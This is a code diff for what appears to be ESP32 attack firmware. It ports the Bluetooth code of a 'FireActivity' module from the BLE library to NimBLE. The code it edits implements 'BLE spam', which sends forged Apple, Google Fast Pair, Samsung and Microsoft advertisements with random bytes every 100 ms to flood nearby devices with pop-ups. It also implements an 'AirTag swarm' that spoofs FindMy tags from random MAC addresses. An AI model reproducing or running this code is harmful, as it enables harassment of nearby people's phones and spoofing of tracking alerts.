@@ -1,8 +1,7 @@
 #include "FireActivity.h"
 
-#include <BLEAdvertising.h>
-#include <BLEDevice.h>
 #include <HalStorage.h>
+#include <NimBLEDevice.h>
 #include <WiFi.h>
 #include <esp_random.h>
 #include <esp_wifi.h>
@@ -319,8 +318,8 @@ void FireActivity::stopAttack() {
   }
 
   // Stop BLE if active
-  if (BLEDevice::getInitialized()) {
-    BLEAdvertising* adv = BLEDevice::getAdvertising();
+  if (NimBLEDevice::isInitialized()) {
+    NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
     if (adv) adv->stop();
   }
 
@@ -810,11 +809,11 @@ void FireActivity::tickBleSpam() {
   if (now - lastActionMs < 100) return;
   lastActionMs = now;
 
-  BLEAdvertising* adv = BLEDevice::getAdvertising();
+  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
   if (!adv) return;
   adv->stop();
 
-  BLEAdvertisementData advData;
+  NimBLEAdvertisementData advData;
   int platform = packetsSent % 4;
 
   switch (platform) {
@@ -833,7 +832,7 @@ void FireActivity::tickBleSpam() {
       appleData[6] = 0x01;  // Status
       for (int i = 7; i < 27; i++) appleData[i] = esp_random() & 0xFF;
 
-      advData.setManufacturerData(String((char*)appleData, 27));
+      advData.setManufacturerData(std::string((char*)appleData, 27));
       break;
     }
     case 1: {
@@ -842,7 +841,7 @@ void FireActivity::tickBleSpam() {
       uint32_t model = models[esp_random() % 3];
       uint8_t svcData[4] = {0x2C, 0xFE,  // UUID 0xFE2C little-endian
                             (uint8_t)((model >> 16) & 0xFF), (uint8_t)((model >> 8) & 0xFF)};
-      advData.setServiceData(BLEUUID((uint16_t)0xFE2C), String((char*)svcData + 2, 2));
+      advData.setServiceData(NimBLEUUID((uint16_t)0xFE2C), std::string((char*)svcData + 2, 2));
       break;
     }
     case 2: {
@@ -851,7 +850,7 @@ void FireActivity::tickBleSpam() {
       samData[0] = 0x75;
       samData[1] = 0x00;  // Company: Samsung
       for (int i = 2; i < 12; i++) samData[i] = esp_random() & 0xFF;
-      advData.setManufacturerData(String((char*)samData, 12));
+      advData.setManufacturerData(std::string((char*)samData, 12));
       break;
     }
     case 3: {
@@ -863,7 +862,7 @@ void FireActivity::tickBleSpam() {
       msData[3] = 0x00;  // RSSI
       msData[4] = esp_random() & 0xFF;
       msData[5] = esp_random() & 0xFF;
-      advData.setManufacturerData(String((char*)msData, 6));
+      advData.setManufacturerData(std::string((char*)msData, 6));
       break;
     }
   }
@@ -893,11 +892,11 @@ void FireActivity::tickAirtagSwarm() {
   if (now - lastActionMs < 200) return;  // 5 tags/sec
   lastActionMs = now;
 
-  BLEAdvertising* adv = BLEDevice::getAdvertising();
+  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
   if (!adv) return;
   adv->stop();
 
-  BLEAdvertisementData advData;
+  NimBLEAdvertisementData advData;
 
   // Apple FindMy advertisement: company 0x004C, type 0x12, payload 0x19
   uint8_t findMyData[29];
@@ -911,7 +910,7 @@ void FireActivity::tickAirtagSwarm() {
   findMyData[27] = 0x00;
   findMyData[28] = 0x00;
 
-  advData.setManufacturerData(String((char*)findMyData, 29));
+  advData.setManufacturerData(std::string((char*)findMyData, 29));
 
   uint8_t addr[6];
   randomMAC(addr);
